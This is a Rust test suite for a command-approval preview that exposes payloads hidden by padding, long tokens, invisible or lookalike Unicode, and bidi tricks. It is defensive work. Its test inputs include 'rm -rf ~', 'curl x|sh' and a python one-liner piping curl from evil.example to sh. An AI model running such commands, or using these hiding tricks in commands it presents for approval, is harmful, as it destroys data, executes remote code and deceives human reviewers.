//! Tests for the approval-card command preview (issue #847).

use super::{
    ApprovalPreviewCache, BLANK_LINE_RUN_COLLAPSE, COLLAPSED_PREVIEW_MAX_CHARS,
    COLLAPSED_PREVIEW_MAX_LINES, LONG_RUN_CHARS, LONG_WHITESPACE_RUN_CHARS, PreviewMode,
    approval_requires_full_view, command_approval_preview, command_shape_summary, one_line_title,
};

/// The display text with zero-width break opportunities removed.
fn visible(text: &str) -> String {
    text.chars().filter(|c| *c != '\u{200B}').collect()
}

fn issue_847_command(token_len: usize) -> String {
    format!("echo {}; touch ~/hidden-payload.txt", "A".repeat(token_len))
}

#[test]
fn short_command_is_shown_verbatim_and_not_truncated() {
    let command = "ls -la && echo done | tee out.txt";
    let preview = command_approval_preview(command, PreviewMode::Collapsed);
    assert_eq!(preview.text, command);
    assert!(!preview.is_truncated());
    assert!(!approval_requires_full_view(command, false));
}

#[test]
fn long_token_keeps_separator_and_tail_visible() {
    let command = issue_847_command(100_000);
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);

    assert!(preview.text.starts_with("echo AAAA"));
    assert!(
        preview.text.ends_with("; touch ~/hidden-payload.txt"),
        "separator and payload must stay visible, got tail {:?}",
        &preview.text[preview.text.len().saturating_sub(60)..]
    );
    assert!(preview.text.contains(';'));
    assert!(preview.text.chars().count() < 400);
}

#[test]
fn long_token_has_marker_with_exact_hidden_count() {
    let command = issue_847_command(100_000);
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);

    // 100,000 'A's minus the 48 head and 24 tail chars kept visible.
    assert_eq!(preview.hidden_chars, 100_000 - 48 - 24);
    assert!(
        preview.text.contains("…[99,928 more chars]…"),
        "{}",
        preview.text
    );
    assert!(preview.is_truncated());
}

#[test]
fn separator_is_highlighted_as_operator() {
    let command = issue_847_command(100_000);
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    let semicolon_index = preview
        .text
        .chars()
        .position(|c| c == ';')
        .expect("separator present");
    assert!(preview.operator_char_indices.contains(&semicolon_index));
}

#[test]
fn every_operator_survives_elision() {
    let long = "x".repeat(5_000);
    let command = format!(
        "a{long};b{long}&&c{long}||d{long}|e{long}&f{long}>g{long}<h{long}$(i{long})`j{long}`'k{long}'\"l{long}\"\\m{long}\nn{long}"
    );
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    let operators: String = command
        .chars()
        .filter(|c| ";&|<>()$`'\"\\\n".contains(*c))
        .collect();
    let shown: String = preview
        .text
        .chars()
        .filter(|c| ";&|<>()$`'\"\\\n".contains(*c))
        .collect();
    assert_eq!(shown, operators);
}

#[test]
fn full_view_contains_the_exact_command() {
    let command = issue_847_command(100_000);
    let preview = command_approval_preview(&command, PreviewMode::Full);
    assert_eq!(visible(&preview.text), command);
    assert!(!preview.is_truncated());
}

#[test]
fn full_view_never_hands_the_renderer_a_word_over_its_limit() {
    // The renderer drops any single shaped word over 16,384 chars. The full view must break
    // every run well below that.
    let command = issue_847_command(100_000);
    let preview = command_approval_preview(&command, PreviewMode::Full);
    let longest_word = longest_unbroken_stretch(&preview.text);
    assert!(
        longest_word <= 1_024,
        "longest unbroken word is {longest_word}"
    );
}

#[test]
fn three_thousand_char_token_is_elided_not_silently_clipped() {
    let command = issue_847_command(3_000);
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert!(preview.is_truncated());
    assert!(preview.text.ends_with("; touch ~/hidden-payload.txt"));
}

#[test]
fn run_at_the_threshold_is_not_elided() {
    let command = format!("echo {}", "A".repeat(LONG_RUN_CHARS));
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert_eq!(preview.text, command);
    assert!(!preview.is_truncated());
}

#[test]
fn long_whitespace_stretch_is_elided_and_tail_kept() {
    let command = format!("true{}; rm -rf ~/x", " ".repeat(20_000));
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert!(preview.is_truncated());
    assert!(preview.text.contains("whitespace chars"));
    assert!(preview.text.ends_with("; rm -rf ~/x"));
}

#[test]
fn many_medium_tokens_cut_middle_with_count_and_separator_note() {
    // 2,000 short statements: no single run is long, but the whole is.
    let command = (0..2_000)
        .map(|i| format!("echo {i:05}"))
        .collect::<Vec<_>>()
        .join("; ")
        + "; touch ~/payload";
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);

    assert!(preview.is_truncated());
    assert!(preview.text.chars().count() <= COLLAPSED_PREVIEW_MAX_CHARS + 100);
    assert!(preview.text.ends_with("; touch ~/payload"));
    assert!(preview.text.contains("hidden here, including"));
    assert!(preview.text.contains("command separators"));
    // Shown plus hidden accounts for every command char.
    let shown_command_chars = preview.text.chars().count() - preview.marker_char_indices.len();
    assert_eq!(
        shown_command_chars + preview.hidden_chars,
        command.chars().count()
    );
}

#[test]
fn control_and_invisible_characters_are_escaped_visibly() {
    let command = "echo safe\r\u{1b}[2K\u{202E}txt.exe\u{200B}; rm x";
    let preview = command_approval_preview(command, PreviewMode::Collapsed);
    assert!(preview.text.contains("<U+000D>"));
    assert!(preview.text.contains("<U+001B>"));
    assert!(preview.text.contains("<U+202E>"));
    assert!(preview.text.contains("<U+200B>"));
    assert!(!preview.text.contains('\r'));
    assert!(!preview.text.contains('\u{1b}'));
    assert!(!preview.text.contains('\u{202E}'));
    assert!(!preview.text.contains('\u{200B}'));
    assert!(!preview.marker_char_indices.is_empty());
    // Escaping is display-only, not truncation.
    assert!(!preview.is_truncated());
}

#[test]
fn newlines_are_kept_as_line_breaks() {
    let command = format!("echo {}\nrm -rf ~/x", "A".repeat(10_000));
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert!(preview.text.ends_with("\nrm -rf ~/x"));
}

#[test]
fn approve_is_gated_until_full_command_shown() {
    let command = issue_847_command(100_000);
    assert!(approval_requires_full_view(&command, false));
    assert!(!approval_requires_full_view(&command, true));
    assert!(!approval_requires_full_view("echo hi; ls", false));
}

#[test]
fn shape_summary_counts_statements_outside_quotes() {
    assert_eq!(command_shape_summary("ls").commands, 1);
    assert_eq!(
        command_shape_summary("a; b && c || d | e & f\ng").commands,
        7
    );
    assert_eq!(command_shape_summary("echo 'a; b' \"c && d\"").commands, 1);
    assert_eq!(command_shape_summary("cmd 2>&1 &>/dev/null").commands, 1);
    assert_eq!(command_shape_summary("echo a\\; b").commands, 1);
    assert_eq!(command_shape_summary("ls;").commands, 1);
    assert_eq!(command_shape_summary(&issue_847_command(100)).commands, 2);
}

#[test]
fn shape_summary_flags_command_substitution() {
    assert!(command_shape_summary("echo $(whoami)").has_command_substitution);
    assert!(command_shape_summary("echo `whoami`").has_command_substitution);
    assert!(command_shape_summary("echo \"$(whoami)\"").has_command_substitution);
    assert!(!command_shape_summary("echo '$(whoami)'").has_command_substitution);
    assert!(!command_shape_summary("echo $HOME").has_command_substitution);
}

#[test]
fn notes_explain_hidden_text_and_multiple_commands() {
    let command = issue_847_command(100_000);
    let cache = ApprovalPreviewCache::new(&command);
    let notes = cache.notes(false);
    assert!(notes[0].contains("99,928 chars of this command are hidden"));
    assert!(notes[0].contains("Press Enter or Show full command"));
    assert!(notes.iter().any(|n| n == "This runs 2 commands."));

    let notes = cache.notes(true);
    assert!(notes[0].starts_with("Showing the full command"));
}

#[test]
fn notes_are_empty_for_a_plain_command() {
    assert!(ApprovalPreviewCache::new("ls -la").notes(false).is_empty());
}

#[test]
fn notes_flag_non_ascii() {
    assert!(
        ApprovalPreviewCache::new("echo cafe")
            .notes(false)
            .is_empty()
    );
    let notes = ApprovalPreviewCache::new("echo caf\u{e9}").notes(false);
    assert!(notes.iter().any(|n| n.contains("non-ASCII")));
}

/// The cache is what the card renders and gates on. It must agree with the pure functions, and
/// it must switch to the full preview only after the user asked for it.
#[test]
fn cache_matches_pure_functions_and_switches_preview_on_show_full() {
    let command = issue_847_command(100_000);
    let cache = ApprovalPreviewCache::new(&command);
    assert_eq!(cache.command(), command);
    assert!(cache.is_truncated());
    assert_eq!(
        cache.requires_full_view(false),
        approval_requires_full_view(&command, false)
    );
    assert!(!cache.requires_full_view(true));

    let collapsed = cache.preview(false);
    assert_eq!(
        collapsed,
        &command_approval_preview(&command, PreviewMode::Collapsed)
    );
    let full = cache.preview(true);
    assert_eq!(visible(&full.text), command);

    // A command with nothing elided never switches to the full preview.
    let plain = ApprovalPreviewCache::new("ls; pwd");
    assert!(!plain.requires_full_view(false));
    assert_eq!(plain.preview(true).text, "ls; pwd");
}

/// #847 review M1: blank lines pushed a payload below the card's fold with nothing elided.
#[test]
fn blank_line_padding_is_collapsed_and_gates_run() {
    let command = format!("echo hi{}rm -rf ~", "\n".repeat(3_000));
    assert!(command.chars().count() < COLLAPSED_PREVIEW_MAX_CHARS);
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert!(preview.is_truncated());
    assert_eq!(
        preview.text,
        "echo hi\n…[2,999 blank lines hidden]…\nrm -rf ~"
    );
    assert_eq!(preview.hidden_chars, 2_998);
    assert!(approval_requires_full_view(&command, false));
}

#[test]
fn blank_lines_with_indentation_are_collapsed_too() {
    let command = format!("echo hi{}rm -rf ~", "\n \t ".repeat(50));
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert!(preview.is_truncated());
    assert!(preview.text.contains("blank lines hidden"));
    assert!(preview.text.ends_with("rm -rf ~"));
}

#[test]
fn a_couple_of_blank_lines_are_left_alone() {
    let blank = "\n".repeat(BLANK_LINE_RUN_COLLAPSE);
    let command = format!("echo a{blank}echo b");
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert_eq!(preview.text, command);
    assert!(!preview.is_truncated());
}

#[test]
fn too_many_lines_cut_the_middle_and_keep_the_last_line() {
    let command = (0..200)
        .map(|i| format!("echo line{i}"))
        .collect::<Vec<_>>()
        .join("\n")
        + "\nrm -rf ~";
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert!(preview.is_truncated());
    assert!(preview.text.lines().count() <= COLLAPSED_PREVIEW_MAX_LINES);
    assert!(preview.text.ends_with("\nrm -rf ~"));
    assert!(preview.text.contains("hidden here, including"));
}

#[test]
fn whitespace_padding_is_elided() {
    let pad = " ".repeat(LONG_WHITESPACE_RUN_CHARS + 1);
    let command = format!("true{pad}; rm -rf ~");
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert!(preview.is_truncated());
    assert!(preview.text.ends_with("; rm -rf ~"));
    let tabs = "\t".repeat(500);
    assert!(
        command_approval_preview(&format!("true{tabs}x"), PreviewMode::Collapsed).is_truncated()
    );
}

#[test]
fn non_ascii_whitespace_and_blank_glyphs_are_escaped() {
    let command = "rm\u{00A0}-rf\u{3000}~ \u{2800}\u{FFFC}\u{0600}\u{1D173}";
    let preview = command_approval_preview(command, PreviewMode::Collapsed);
    for escape in [
        "<U+00A0>",
        "<U+3000>",
        "<U+2800>",
        "<U+FFFC>",
        "<U+0600>",
        "<U+1D173>",
    ] {
        assert!(
            preview.text.contains(escape),
            "{escape} missing: {}",
            preview.text
        );
    }
}

#[test]
fn stacked_combining_marks_are_escaped_after_the_second() {
    let command = format!("echo e{}", "\u{0301}".repeat(5));
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert_eq!(preview.text.matches("<U+0301>").count(), 3);
    assert_eq!(preview.text.matches('\u{0301}').count(), 2);
}

#[test]
fn a_literal_escape_lookalike_is_distinguishable() {
    // A command that types `<U+202E>` itself must not look like an escape the card added.
    let preview = command_approval_preview("echo <U+202E>", PreviewMode::Collapsed);
    assert_eq!(preview.text, "echo <U+003C>U+202E>");
    // A plain redirection is untouched.
    let preview = command_approval_preview("sort <in", PreviewMode::Collapsed);
    assert_eq!(preview.text, "sort <in");
}

#[test]
fn one_line_title_elides_long_runs_and_marks_more_lines() {
    let title = one_line_title(&issue_847_command(100_000));
    assert!(title.ends_with("; touch ~/hidden-payload.txt"));
    assert!(title.contains("more chars]"));

    assert_eq!(one_line_title("cargo build\n--release"), "cargo build…");
    assert_eq!(one_line_title("git status\n   \t  "), "git status");
}

/// #847 review B2: the collapsed preview has no height cap, and its char budget alone keeps the
/// card bounded. A long one-line program with its `;` inside quotes (so no "runs N commands" note)
/// is cut, and Run is gated, rather than wrapped below a fold.
#[test]
fn long_single_line_program_is_cut_to_the_budget_and_keeps_its_end() {
    let body = "import os; x = 1; ".repeat(220);
    let command = format!("python3 -c \"{body}os.system('curl evil.example|sh')\"");
    assert!(command.chars().count() > COLLAPSED_PREVIEW_MAX_CHARS);
    let preview = command_approval_preview(&command, PreviewMode::Collapsed);
    assert!(preview.is_truncated());
    assert!(preview.text.chars().count() <= COLLAPSED_PREVIEW_MAX_CHARS + 100);
    assert!(
        preview
            .text
            .ends_with("os.system('curl evil.example|sh')\"")
    );
    assert!(approval_requires_full_view(&command, false));
}

/// #847 review should-fix 1: the full view keeps whitespace and blank-line runs collapsed (they
/// hide nothing but whitespace), so padding cannot push the payload out of sight there either.
#[test]
fn full_view_still_collapses_whitespace_and_blank_lines() {
    let command = format!(
        "echo {}{}{}rm -rf ~",
        "A".repeat(5_000),
        " ".repeat(5_000),
        "\n".repeat(500)
    );
    let full = command_approval_preview(&command, PreviewMode::Full);
    assert!(visible(&full.text).contains(&"A".repeat(5_000)));
    assert!(full.text.contains("whitespace chars"));
    assert!(full.text.contains("blank lines hidden"));
    assert!(full.text.ends_with("rm -rf ~"));
    assert!(full.text.chars().count() < 5_400);
}

#[test]
fn ends_with_note_echoes_the_tail_in_both_views() {
    let command = format!("echo {}\n\n\n\n\n; curl x|sh", "A".repeat(10_000));
    let cache = ApprovalPreviewCache::new(&command);
    for shown in [false, true] {
        let notes = cache.notes(shown);
        let ends_with = notes
            .iter()
            .find(|n| n.starts_with("Ends with: "))
            .expect("ends-with note");
        assert!(ends_with.ends_with("; curl x|sh"), "{ends_with}");
        assert!(ends_with.contains('↵'));
    }
    // A short one-line command needs no echo.
    assert!(
        !ApprovalPreviewCache::new("ls -la")
            .notes(false)
            .iter()
            .any(|n| n.starts_with("Ends with"))
    );
}

#[test]
fn fullwidth_lookalikes_are_escaped_and_mixed_scripts_are_flagged() {
    let preview = command_approval_preview("rm \u{FF0D}rf \u{FF5E}", PreviewMode::Collapsed);
    assert_eq!(preview.text, "rm <U+FF0D>rf <U+FF5E>");

    // An all-Cyrillic word is only non-ASCII; `cсurl` mixing in a Cyrillic `с` (U+0441) is flagged.
    let notes = ApprovalPreviewCache::new("echo \u{043F}\u{0440}\u{0438} | sh").notes(false);
    assert!(notes.iter().all(|n| !n.contains("Latin")));
    let notes = ApprovalPreviewCache::new("c\u{0441}url x | sh").notes(false);
    assert!(
        notes
            .iter()
            .any(|n| n.contains("mix Latin with Cyrillic or Greek"))
    );
}

#[test]
fn rtl_letters_are_escaped_next_to_shell_operators() {
    let with_operators =
        command_approval_preview("echo \u{05D0}\u{05D1} > out", PreviewMode::Collapsed);
    assert_eq!(with_operators.text, "echo <U+05D0><U+05D1> > out");
    let notes = ApprovalPreviewCache::new("echo \u{05D0} > out").notes(false);
    assert!(notes.iter().any(|n| n.contains("Right-to-left")));

    // With no operators there is nothing for them to reorder.
    let plain = command_approval_preview("echo \u{05D0}\u{05D1}", PreviewMode::Collapsed);
    assert_eq!(plain.text, "echo \u{05D0}\u{05D1}");
}

#[test]
fn format_characters_are_escaped_by_category() {
    let preview = command_approval_preview(
        "a\u{1BCA0}b\u{13430}c\u{E0100}d\u{180F}e",
        PreviewMode::Collapsed,
    );
    for escape in ["<U+1BCA0>", "<U+13430>", "<U+E0100>", "<U+180F>"] {
        assert!(
            preview.text.contains(escape),
            "{escape} missing: {}",
            preview.text
        );
    }
}

/// The longest segment of `text` between two UAX #14 line-break opportunities, measured with
/// the same segmenter cosmic-text uses. The shaper treats such a segment as one word. Spaces are
/// not assumed to be breaks: `( (`, `"( "(` and `— —` keep theirs unbroken.
fn longest_unbroken_stretch(text: &str) -> usize {
    let mut previous = 0;
    let mut longest = 0;
    for (position, _) in unicode_linebreak::linebreaks(text) {
        longest = longest.max(text[previous..position].chars().count());
        previous = position;
    }
    longest
}

/// #847 round 3, N1 (#864): quotes, operators and escapes glued to letters give the shaper no
/// break, so the full view must count chars across pieces. Otherwise one shaped word over 16,384
/// chars is dropped by the renderer.
#[test]
fn full_view_breaks_words_glued_together_from_many_pieces() {
    let quoted_a = format!("\"{}\"", "A".repeat(200));
    let cases = [
        "a\"".repeat(10_000),
        "a;".repeat(10_000),
        format!("echo {}", vec![quoted_a; 100].join("+")),
        "a\u{202E}".repeat(10_000),
        "a$(b)".repeat(4_000),
        format!("x{}", "<U+".repeat(6_000)),
        // Spaces that UAX #14 does not break at (LB14, LB15, LB17).
        "( ".repeat(10_000),
        "\"( ".repeat(7_000),
        "\u{2014} ".repeat(10_000),
        // Combining marks: a break must not separate a base from its mark.
        "e\u{0301}".repeat(10_000),
    ];
    for command in cases {
        assert!(command.chars().count() > 16_384);
        let full = command_approval_preview(&command, PreviewMode::Full);
        let longest = longest_unbroken_stretch(&full.text);
        assert!(
            longest <= 1_024,
            "unbroken stretch of {longest} chars in the full view of {}…",
            command.chars().take(10).collect::<String>()
        );
        assert_eq!(full.hidden_chars, 0);
    }
}

/// Operator and marker indices stay aligned with the text after breaks are inserted.
#[test]
fn full_view_highlight_indices_point_at_operators_and_escapes() {
    let command = format!("{}\u{202E}", "a;".repeat(1_000));
    let full = command_approval_preview(&command, PreviewMode::Full);
    let chars: Vec<char> = full.text.chars().collect();
    assert!(!full.operator_char_indices.is_empty());
    for index in &full.operator_char_indices {
        assert_eq!(chars[*index], ';');
    }
    let marker: String = full
        .marker_char_indices
        .iter()
        .map(|index| chars[*index])
        .collect();
    assert_eq!(marker, "<U+202E>");
}

#[test]
fn collapsed_preview_never_has_a_word_near_the_renderer_limit() {
    let command = "a\"".repeat(10_000);
    let collapsed = command_approval_preview(&command, PreviewMode::Collapsed);
    assert!(longest_unbroken_stretch(&collapsed.text) <= COLLAPSED_PREVIEW_MAX_CHARS + 100);
}

#[test]
fn rtl_letters_are_left_alone_when_operators_are_quoted_or_on_another_line() {
    let quoted = command_approval_preview("echo \"\u{05D0}\u{05D1} > x\"", PreviewMode::Collapsed);
    assert_eq!(quoted.text, "echo \"\u{05D0}\u{05D1} > x\"");
    let other_line =
        command_approval_preview("echo \u{05D0}\u{05D1}\nls > out", PreviewMode::Collapsed);
    assert_eq!(other_line.text, "echo \u{05D0}\u{05D1}\nls > out");
    let same_line = command_approval_preview("ls > out; echo \u{05D0}", PreviewMode::Collapsed);
    assert_eq!(same_line.text, "ls > out; echo <U+05D0>");
}

#[test]
fn everyday_cjk_punctuation_is_not_escaped_but_operator_lookalikes_are() {
    let preview = command_approval_preview(
        "echo \u{4F60}\u{597D}\u{FF0C}\u{FF1A}\u{FF01}\u{FF1F} \u{FF1B}\u{FF5C}\u{FF08}\u{FF09}",
        PreviewMode::Collapsed,
    );
    assert!(
        preview
            .text
            .starts_with("echo \u{4F60}\u{597D}\u{FF0C}\u{FF1A}\u{FF01}\u{FF1F} ")
    );
    assert!(preview.text.ends_with("<U+FF1B><U+FF5C><U+FF08><U+FF09>"));
}

#[test]
fn unassigned_code_points_are_not_escaped() {
    // U+1FAE9 is unassigned in older Unicode tables and a new emoji in newer ones; either way it
    // is not a hiding character.
    let preview = command_approval_preview("echo \u{1FAE9}", PreviewMode::Collapsed);
    assert_eq!(preview.text, "echo \u{1FAE9}");
}

#[test]
fn full_view_never_puts_a_break_between_a_base_and_its_combining_mark() {
    let command = "e\u{0301}".repeat(10_000);
    let full = command_approval_preview(&command, PreviewMode::Full);
    assert!(!full.text.contains("\u{200B}\u{0301}"));
    assert!(full.text.contains('\u{200B}'));
}

#[test]
fn rtl_letters_next_to_live_expansions_inside_double_quotes_are_escaped() {
    // `$` and backticks still expand inside double quotes, so the line counts as having an
    // operator.
    let preview = command_approval_preview("echo \"\u{05D0} $(id)\"", PreviewMode::Collapsed);
    assert_eq!(preview.text, "echo \"<U+05D0> $(id)\"");
}

#[test]
fn unassigned_default_ignorables_are_escaped() {
    let preview = command_approval_preview("a\u{2065}b\u{FFF0}c\u{E0FFF}d", PreviewMode::Collapsed);
    assert_eq!(preview.text, "a<U+2065>b<U+FFF0>c<U+E0FFF>d");
}

/// One base character with 20,000 nonspacing marks: every mark after the second is escaped, and
/// escapes are not marks, so breaks still land and no segment approaches the renderer limit.
#[test]
fn a_huge_combining_mark_stack_is_escaped_and_broken() {
    let command = format!("e{}", "\u{0301}".repeat(20_000));
    let full = command_approval_preview(&command, PreviewMode::Full);
    assert!(longest_unbroken_stretch(&full.text) <= 1_024);
    assert!(full.text.contains("<U+0301>"));
}

/// A long run of spacing marks (Mc, here Devanagari visarga) is not escaped, and breaks may sit
/// between them, so segments stay bounded.
#[test]
fn a_long_spacing_mark_run_is_broken() {
    let command = format!("\u{0915}{}", "\u{0903}".repeat(20_000));
    let full = command_approval_preview(&command, PreviewMode::Full);
    assert!(longest_unbroken_stretch(&full.text) <= 1_024);
}
